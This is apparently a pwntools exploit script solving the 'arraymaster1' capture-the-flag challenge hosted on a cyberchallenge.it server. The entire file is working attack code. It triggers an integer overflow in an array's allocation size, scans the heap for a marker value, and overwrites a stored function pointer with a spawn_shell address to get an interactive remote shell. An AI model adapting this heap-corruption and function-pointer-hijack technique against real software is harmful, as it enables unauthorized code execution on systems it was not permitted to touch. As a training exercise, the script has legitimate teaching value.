from pwn import *


# context.binary = './arraymaster1'
# p = process()

p = remote('arraymaster1.challs.cyberchallenge.it', '9125')


# Array 'A' has 5 + 1 (for overflow) bytes allocated on heap
# 2305843009213693953 = 0010 0000 ... 0000 0001;	The program, then, will allocate bytes as <size * 8> (8 bytes for integer)
payload = 'init A 64 2305843009213693953'
p.sendlineafter(b'\n> ', payload)

# Array 'B' has 5 + 4 bytes allocated on heap
payload = 'init B 64 4'
p.sendlineafter(b'\n> ', payload)

# Set a "flag" to recognize when reading from the heap
payload = 'set B 0 99999999'
p.sendlineafter(b'\n> ', payload)


B_set_func_offset = 0	# Offset we can use to access int64_set function of B (comes before the start of subarray of B)
i = 0
while True:
	payload = f'get A {i}'
	p.sendlineafter(b'\n> ', payload)

	output = int(p.recvlineS())	

	# Found our "flag"
	if output == 99999999:
		B_set_func_offset = i - 2	# "-2" because there's something else between 99999999 and the function address
		break

	i += 1

# Overwrite int64_set function with spawn_shell function (no need to pack it, just convert it to int)
payload = f'set A {B_set_func_offset} {0x004009c3}'
print(payload)
p.sendlineafter(b'\n> ', payload)

# Call function and get the freaking shell!
payload = 'set B 0 0'		# Some random arguments  we don't care about
p.sendafter(b'\n> ', payload)
p.interactive()
